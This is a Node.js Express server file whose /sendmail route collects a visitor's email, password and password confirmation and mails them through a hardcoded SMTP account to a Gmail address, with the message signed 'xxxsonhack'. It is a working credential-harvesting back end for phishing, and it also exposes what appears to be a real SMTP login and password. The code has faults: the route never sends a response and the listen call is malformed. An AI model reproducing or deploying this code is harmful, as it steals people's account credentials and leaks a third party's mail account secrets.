const express = require("express");
const cors = require("cors");
const app = express();

app.use(cors());

const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

require("dotenv").config();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.send("api is run");
});

app.post("/sendmail", async (req, res) => {
  let { email, pass, pasers } = req.body;
  let transporter = nodemailer.createTransport({
    host: "mail.whitetransport.net", // SMTP server address (usually mail.your-domain.com)
    port: 465, // Port for SMTP (usually 465)
    auth: {
      user: "mustafa@whitetransport.net", // Your email address
      pass: "uf4DBAatO5Ut", // Password (for gmail, your app password)
      // ⚠️ For better security, use environment variables set on the server for these values when deploying
    },
  });

  // Define and send message inside transporter.sendEmail() and await info about send from promise:
  let info = await transporter.sendMail({
    from: '"You" <mustafa@whitetransport.net>',
    to: "fredrick3smith33@gmail.com",
    subject: "Testing, testing, 123",
    html: `
    <div> 
      <h2>Here is your email!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
    `,
  });
});

const PORT = 5000;

app.listen(console.log(`server in Production on ${PORT}`));
